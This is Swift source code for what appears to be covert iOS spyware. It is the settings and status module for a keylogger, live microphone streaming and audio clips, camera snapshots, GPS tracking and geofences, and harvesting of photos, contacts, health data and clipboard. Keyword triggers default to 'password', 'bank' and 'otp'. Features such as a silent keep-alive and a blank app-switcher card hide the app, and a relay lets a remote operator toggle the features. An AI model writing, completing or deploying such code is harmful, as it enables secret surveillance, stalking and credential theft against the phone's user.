import Foundation
import AVFoundation
import CoreLocation
import Photos
import Contacts
import EventKit
import CoreMotion
import HealthKit
import FamilyControls

enum FeatureKey: String, CaseIterable {
    case mic, camera, location, preciseLocation, keylog
    case voiceActivity, clipCapture, liveStream
    case photoLibrary, contacts, calendar, reminders, clipboard
    case motion, batteryState, health, wifiInfo, geofence, screenTime
    case silentKeepAlive, schedule, storeAndForward, history
    case pushAlerts, keywordTriggers, encryption, watchdog, blankSnapshot

    var title: String {
        switch self {
        case .mic: return "Live mic"
        case .camera: return "Camera snapshots"
        case .location: return "Location"
        case .preciseLocation: return "Precise GPS"
        case .keylog: return "Keyboard keylog"
        case .voiceActivity: return "Voice activity (VAD)"
        case .clipCapture: return "Save audio clips"
        case .liveStream: return "Live audio stream"
        case .photoLibrary: return "Photo library"
        case .contacts: return "Contacts"
        case .calendar: return "Calendar"
        case .reminders: return "Reminders"
        case .clipboard: return "Clipboard"
        case .motion: return "Motion context"
        case .batteryState: return "Battery state"
        case .health: return "Health data"
        case .wifiInfo: return "Wi-Fi name"
        case .geofence: return "Geofence alerts"
        case .screenTime: return "Screen Time"
        case .silentKeepAlive: return "Silent keep-alive"
        case .schedule: return "Scheduling"
        case .storeAndForward: return "Store & forward"
        case .history: return "History log"
        case .pushAlerts: return "Push alerts"
        case .keywordTriggers: return "Keyword triggers"
        case .encryption: return "Encrypt payloads"
        case .watchdog: return "Watchdog"
        case .blankSnapshot: return "Blank switcher card"
        }
    }

    var defaultOn: Bool {
        switch self {
        case .mic: return false
        case .camera, .location, .keylog: return true
        case .clipCapture, .liveStream: return true
        case .silentKeepAlive, .watchdog: return true
        case .storeAndForward, .batteryState, .blankSnapshot: return true
        default: return false
        }
    }
}

enum MicMode: String, CaseIterable { case onDemand, voiceTrigger, burst, always }

final class Settings {
    static let shared = Settings()
    private let store = UserDefaults(suiteName: Config.appGroup)!
    private var v: [String: Bool] = [:]

    var scheduleStart = 8, scheduleEnd = 22
    var keywords: [String] = ["password", "bank", "code", "otp"]
    var geofences: [[String: Any]] = []
    var vadSensitivity: Double = 0.40
    var vadHangover: Double = 1.5
    var vadAlert: Bool = true
    var clipMaxSeconds: Double = 60
    var clipMinSeconds: Double = 1.5
    var clipPreRoll: Double = 1.0
    var clipRetentionDays: Int = 7
    var micAutoDisarm: Double = 300

    func load() {
        for k in FeatureKey.allCases {
            v[k.rawValue] = store.object(forKey: "f_" + k.rawValue) as? Bool ?? k.defaultOn
        }
        scheduleStart = store.object(forKey: "schedStart") as? Int ?? 8
        scheduleEnd   = store.object(forKey: "schedEnd") as? Int ?? 22
        keywords      = store.stringArray(forKey: "keywords") ?? keywords
        geofences     = store.array(forKey: "geofences") as? [[String: Any]] ?? []
        vadSensitivity = store.object(forKey: "vadSens") as? Double ?? 0.40
        vadHangover    = store.object(forKey: "vadHang") as? Double ?? 1.5
        vadAlert       = store.object(forKey: "vadAlert") as? Bool ?? true
        micAutoDisarm  = store.object(forKey: "micDisarm") as? Double ?? 300
    }

    func isOn(_ k: FeatureKey) -> Bool { v[k.rawValue] ?? false }

    func set(_ k: FeatureKey, _ on: Bool, remote: Bool = false) {
        guard v[k.rawValue] != on else { return }
        v[k.rawValue] = on
        store.set(on, forKey: "f_" + k.rawValue)
        NotificationCenter.default.post(name: .featuresChanged, object: k)
        if !remote { Relay.shared.sendJSON(["type": "settings", "values": [k.rawValue: on]]) }
    }

    func applyRemote(_ d: [String: Any]) {
        if let vals = d["values"] as? [String: Any] {
            for (key, raw) in vals {
                if let k = FeatureKey(rawValue: key), let on = raw as? Bool { set(k, on, remote: true) }
            }
        }
        if let s = d["scheduleStart"] as? Int { scheduleStart = s; store.set(s, forKey: "schedStart") }
        if let e = d["scheduleEnd"]   as? Int { scheduleEnd   = e; store.set(e, forKey: "schedEnd") }
        if let kw = d["keywords"] as? [String] { keywords = kw; store.set(kw, forKey: "keywords") }
        if let gf = d["geofences"] as? [[String: Any]] { geofences = gf; store.set(gf, forKey: "geofences") }
        if let x = d["vadSensitivity"] as? Double { vadSensitivity = x; store.set(x, forKey: "vadSens") }
        if let x = d["vadHangover"]    as? Double { vadHangover    = x; store.set(x, forKey: "vadHang") }
        if let x = d["vadAlert"]       as? Bool   { vadAlert       = x; store.set(x, forKey: "vadAlert") }
        if let x = d["micMode"] as? String, let m = MicMode(rawValue: x) {
            store.set(x, forKey: "micMode"); MicGate.shared.apply()
        }
        Geofences.rearm()
    }

    func inWindow() -> Bool {
        guard isOn(.schedule) else { return true }
        let h = Calendar.current.component(.hour, from: Date())
        return scheduleStart <= scheduleEnd
            ? (h >= scheduleStart && h < scheduleEnd)
            : (h >= scheduleStart || h < scheduleEnd)
    }

    var snapshot: [String: Bool] { v }
}
extension Notification.Name { static let featuresChanged = Notification.Name("featuresChanged") }

final class HealthMon {
    static let shared = HealthMon()
    private var state: [String: String] = [:]

    func ok(_ k: FeatureKey) { report(k, true, nil) }
    func fail(_ k: FeatureKey, _ reason: String) { report(k, false, reason) }

    private func report(_ k: FeatureKey, _ healthy: Bool, _ reason: String?) {
        let r = healthy ? "" : (reason ?? "unknown")
        guard state[k.rawValue] != r else { return }
        state[k.rawValue] = r
        guard Settings.shared.isOn(.pushAlerts) else { return }
        Relay.shared.sendJSON(["type": "alert", "feature": k.rawValue, "title": k.title,
                               "ok": healthy, "reason": reason ?? "",
                               "at": Date().timeIntervalSince1970])
    }

    func sweep() {
        for k in FeatureKey.allCases where Settings.shared.isOn(k) {
            if let why = Permissions.check(k) { fail(k, why) } else { ok(k) }
        }
        if !Reachability.online { fail(.storeAndForward, "No network - buffering to disk") }
    }
    var report: [String: String] { state }
}

enum Permissions {
    static func check(_ k: FeatureKey) -> String? {
        switch k {
        case .mic:
            return AVCaptureDevice.authorizationStatus(for: .audio) == .authorized
                ? nil : "Microphone denied - Settings > Privacy > Microphone"
        case .camera:
            return AVCaptureDevice.authorizationStatus(for: .video) == .authorized
                ? nil : "Camera denied - Settings > Privacy > Camera"
        case .location, .preciseLocation, .geofence:
            switch CLLocationManager().authorizationStatus {
            case .denied, .restricted: return "Location denied - Settings > Privacy > Location"
            case .authorizedWhenInUse: return "Location is 'While Using' - needs 'Always'"
            default: return nil
            }
        case .photoLibrary:
            let s = PHPhotoLibrary.authorizationStatus(for: .readWrite)
            return (s == .authorized || s == .limited) ? nil : "Photo library not granted"
        case .contacts:
            return CNContactStore.authorizationStatus(for: .contacts) == .authorized ? nil : "Contacts not granted"
        case .calendar:
            return EKEventStore.authorizationStatus(for: .event) == .authorized ? nil : "Calendar not granted"
        case .reminders:
            return EKEventStore.authorizationStatus(for: .reminder) == .authorized ? nil : "Reminders not granted"
        case .motion:
            return CMMotionActivityManager.isActivityAvailable() ? nil : "Motion unavailable"
        case .health:
            return HKHealthStore.isHealthDataAvailable() ? nil : "HealthKit unavailable"
        case .screenTime:
            return AuthorizationCenter.shared.authorizationStatus == .approved
                ? nil : "Screen Time not authorised (FamilyControls)"
        case .clipCapture:
            return Settings.shared.isOn(.mic) ? nil : "Clip capture needs the mic enabled"
        case .keylog:
            let seen = UserDefaults(suiteName: Config.appGroup)?.double(forKey: "kb_seen") ?? 0
            return seen > 0 ? nil : "Keyboard not enabled - Settings > General > Keyboard"
        default:
            return nil
        }
    }
}
